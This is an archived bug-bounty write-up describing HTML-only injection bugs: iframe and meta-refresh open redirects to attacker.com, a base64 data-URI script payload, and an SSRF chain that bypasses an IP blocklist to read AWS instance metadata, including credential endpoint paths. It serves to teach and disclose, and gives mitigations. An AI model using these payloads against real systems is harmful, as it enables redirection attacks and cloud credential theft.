---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-01-10_hunting-good-bugs-with-only-html.md
original_filename: 2020-01-10_hunting-good-bugs-with-only-html.md
title: Hunting Good Bugs with only <HTML>
category: documents
detected_topics:
- xss
- ssrf
- cloud-security
- oauth
- sso
- command-injection
tags:
- imported
- documents
- xss
- ssrf
- cloud-security
- oauth
- sso
- command-injection
language: en
raw_sha256: 7f93272ee4959313c3a408b5373673936fa59d5a046b8f8d4400affcb8f47f11
text_sha256: 5af971346f4121e3e2e7757f72d4e119f626e5550f1588d35afc9406aaf8105f
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# Hunting Good Bugs with only <HTML>

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-01-10_hunting-good-bugs-with-only-html.md
- Source Type: markdown
- Detected Topics: xss, ssrf, cloud-security, oauth, sso, command-injection
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `7f93272ee4959313c3a408b5373673936fa59d5a046b8f8d4400affcb8f47f11`
- Text SHA256: `5af971346f4121e3e2e7757f72d4e119f626e5550f1588d35afc9406aaf8105f`


## Content

---
title: "Hunting Good Bugs with only <HTML>"
url: "https://medium.com/@know.0nix/hunting-good-bugs-with-only-html-d8fd40d17b38"
authors: ["Ak1T4 (@akita_zen)"]
bugs: ["Open redirect", "HTML injection", "SSRF"]
publication_date: "2020-01-10"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4835
scraped_via: "browseros"
---

# Hunting Good Bugs with only <HTML>

Top highlight

Hunting Good Bugs with only <HTML>
Ak1T4
Follow
7 min read
·
Jan 10, 2020

1K

Hey hunters! being a while of my last post! so let’s get deep on this right now!

Really? it’s kind a joke? Getting bugs with <HTML>?

Grumpy Cat love JS
<iframe> tag — (Client side bug)
P2 on Bugcrowd <iframe> injection

This tag is just amazing, let me explain you why:

IFrame’s Tag & Open Redirects

<iframe> tag serves developers if they need to include an html document inside another html document. If source of inserted document located on another origin, same origin policy will block any access to content of other document for both of them. So, if you try to get content of child document from another origin, you end with SOP error in console.

There is a legal violation applied to iframes. Developer who codes this tag sometimes has to work with location of child or parent document

The violation here is: child document can view and set location property for parent, even if cross-origin (top.window.location)

“even if cross-origin” : wait what? a child iframe can handle the parent behavior? where is the SOP policy?

child iframe taken his soup

Reproduction Steps & PoC

Inject an iframe

<iframe src=//attacker.com/toplevel.html></iframe>

//attacker.com/toplevel.html will be:

<html><head></head><body><script>top.window.location = “https://attacker.com/hacked.html"</script></body></html>

When iframe is loaded, parent will be redirect to the evil page! even when iframe is loaded with //attacker.com/ and victim //victim.com/ (different origins) SOP is bypassed due the iframe NOT being “sandboxed”

Why severity as P2? seems quite lame Huh? In this particular scenario, this bug affects 3 different domains on the entire app, (internal & public links) including all the wildcards *.restricted.com, *.restricted2.com, *.restricted3.com which is quite critical :)

Fix & Mitigation

The common mitigation for this bug its patching iframes with a sandbox attribute. It is basically an attribute which rules the execution and access policy for child document. In this particular case you would like to have sandbox=’allow-scripts’ but not sandbox=’ allow-scripts allow-top-navigation’, so no top-navigation will be allowed for scripts running in child document.

<meta> tag (Client Side Bug)
Press enter or click to view image in full size
im waiting to program set this as P2 due to the wide impact in the app, so let’s wait for some lucky (even with P3 at this program we get reward :)

Some <meta> tags are informational (let's call these passive)
<meta name="description" content="...">
And some affect the page in some way (let's call these active)
<meta http-equiv="Set-Cookie" content="SESSID=1">

In CSP there is no way to revoke the power of these active ones.

<meta http-equiv="... is a tag on the page that may emulate a subset of functions normally reserved for page headers. Equally, some of these functions appear in JavaScript (which is obviously already heavily governed by CSP).
Dangerous functions that can be performed by <meta http-equiv="... include

Set-Cookie
Refresh
Redirect to any regular URL
Redirect to any data: URL

I mention both of these, because they can both be addressed by the same directive: http-equiv
e.g.
Content-Security-Policy: default-src 'self';, or Content-Security-Policy: http-equiv 'self'; would disallow http-equiv in <meta>, 'self' would infer the equivalent headers should be used. 'none' keyword would have equivalent meaning here.

Hashes could be used to selectively enable based on the content=”…”. Similarly nonces could be specified inline.

Optionally, the values for http-equiv could be selectively specified to enable them
Content-Security-Policy: http-equiv 'set-cookie' 'refresh';, or Content-Security-Policy: http-equiv set-cookie refresh;

Content-Security-Policy: http-equiv 'unsafe-inline'; could be used restore default unsafe behaviour.

Obviously there are a few ways this could be implemented, the above is a suggestion. The main aim here is that site owners have a mechanism whereby they may disable active <meta> tags if they don't want to use them.

source: https://github.com/w3c/webappsec-csp/issues/112

If you notice the above information, seems that we can use <meta> tag with content=”0;data:” URI, so An attacker with this payload can force a victim to execute arbitrary code, (seems working on safari only)

<meta name=“language” content=”0;data:text/html;base64,PHNjcmlwdD5wcm9tcHQoIlhzc2VkIGJ5IGFrMXQ0Iik8L3NjcmlwdD4=“ HTTP-EQUIV=”refresh”” />

That’s Nice, but FIREFOX/CHROME will block this :(

Navigation to toplevel data: URI not allowed (chrome)
Not allowed to navigate top frame to data URL (firefox)

[ A recent time ago i found a CSP Bypass over SAFARI browsers with:

<object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”></object>

this was listed over PayloadsAllTheThings:

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection (you can find other bypasses here) ] Maybe you find it useful :)

But we have a really limited attack surface here, and this write up is about <html> injection.. so move on & let’s improve this

something related to lord of the rings :/

<meta> Using HTTP-EQUIV Refresh as Open Redirects

Reproduction Steps & PoC

An attacker using this payload can force victims to be redirected to an evil page:

inject this payload:

<meta name=“language” content=”5;http://attacker.com/poc.svg" HTTP-EQUIV=”refresh”” />

In this case The Current CSP Policy on the Website will not block <meta http-equiv=>

So victim will be redirected to the evil page in 5 secs

All browsers are affected because its a “legal” redirect:

Mitigations?

CSP can filter http-equiv and/or disallow <meta> tag injection directly from the website/app

*Remember that Open Redirects can be really harmfull & used in a lot of different attacks including chained bugs:

Oauth/SSO flows on redirect uri
iframe injection
Stealing Auth headers, token headers,
SSRF, etc
Escalating <HTML> injection to Server Side Bugs

<meta> and <iframe> tags chained

P1 on private program Bugcrowd

Functional Description of the Website/App

Get Ak1T4’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

The website/app permit the creation of dynamic pages, when the page is created, a headless browser on server side take a snapshot of the page,

The headless browser parses our html page (code edited from the app or uploaded as a file)
The headless browser take an snapshot of the page and show the output as image in the web application (we got output!)

This seems really Nice scenario for find some bugs, Huh?

chuck is your friend

After reading a lot of greats write ups of some amazing bughunters like: Gwendal Le Coguic, Brett Buerhaus , Rahul Maini

https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/

http://web.archive.org/web/20190522083351/http://10degres.net/aws-takeover-ssrf-javascript/

https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html

I realize that: “ headless browser has complete disabled Javascript :( “

me in that moment

Ok now guess what? Yes: “HTML injection”

I can use HTML tags but not JS execution, so i tried all the tags that you can imagine in the file.html with any results (even iframe was filtered) :(

Remember the <meta> tag with http-equiv? why don’t try a redirect?

The headless browser will follow???

file.html

<HTML> <HEAD> <meta http-equiv=”refresh” content=”0; url=http://attacker.com”> <TITLE> The title of your page </TITLE> </HEAD> <BODY> <img editable=”true” width=”10"> </BODY> </HTML>

After parser executes this file i got a picture of “https://attacker.com” webpage as output!

So any page over content=”0;url=http://google.com” will be displayed as an snapshot output:

example of google surfed by the internal headless browser

Ok, we handle the redirects of the headless browser, so i reported this to the program & i receive the next response:

Press enter or click to view image in full size
response program

Did you see that? “Our last SSRF over AWS instance?” OK let’s go for it!

iframe tag is filtered, so i can’t iframe “http://169.254.169.254/latest/meta-data/hostname” directly

I think on this:

“i Have a redirect, now i need an endpoint page which renderize an <iframe> with the AWS instance url”

httpbin.org comes to rescue

httpbin has a lot of services, i use it generally for get my origin ip like:

curl httpbin.org/ip

{

“origin”: “191.x.x.x, 191.x.x.149”

}

One of their services call my attention: was the “base64” page:

Work like this:

http://httpbin.org/base64/yourbase64code

live example will be: http://httpbin.org/base64/YWsxdDQgcnVsZXoh

you will see the text: ak1t4 rules!

(Any html tag will be decoded and rendered in the page) but remember that we cannot use JS! headless browser will not process it

I try the next payload without any luck:

<iframe src=”http://169.254.169.254/latest/meta-data/hostname"></iframe>

https://httpbin.org/base64/PGlmcmFtZSBzcmM9Imh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS9ob3N0bmFtZSI+PC9pZnJhbWU+

This will iframe the AWS instance, but dosn’t work: why? remember that instances & internal IPS were blacklisted?

Ok let’s bypass this!

So i try:

<iframe src=”http://1ynrnhl.xip.io/latest/meta-data/hostname"></iframe>

1ynrnhl.xip.io == 169.254.169.254

Final Payload inside file.html

<meta http-equiv=”refresh” content=”0; url=http:/httpbin.org/base64/PGlmcmFtZSBzcmM9Imh0dHA6Ly8xeW5ybmhsLnhpcC5pby9sYXRlc3QvbWV0YS1kYXRhL2hvc3RuYW1lIj48L2lmcmFtZT4=”>

This payload redirect the headless browser to httpbin service
httpbin will decode the base64 and iframe the AWS instance
Headless browser will output response with an snapshot

and…

aws meta-data

BOOM! WE GOT SSRF with <META> + <IFRAME> tags chained!

the love of a P1

From here we can reach any AWS endpoint:

http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy http://169.254.169.254/latest/user-data http://169.254.169.254/latest/user-data/iam/security-credentials/role

http://169.254.169.254/latest/meta-data/ami-id http://169.254.169.254/latest/meta-data/reservation-id http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key

I asked to the team for escalate this to RCE, but their response was:

Press enter or click to view image in full size
Press enter or click to view image in full size

So that’s all folks, i hope you enjoy this reading as i enjoyed writing!

Just a reminder: “Bugbounty needs to be fun, play a little, break some things & don’t forget to smile! nothing is to serious, enjoy life”

Best regards,

Ak1T4

ak1t4 🇦🇷
The latest Tweets from ak1t4 🇦🇷 (@akita_zen). [ Bug Bounty Hunter - Zen Monk] "Beautiful things don't ask for…

twitter.com
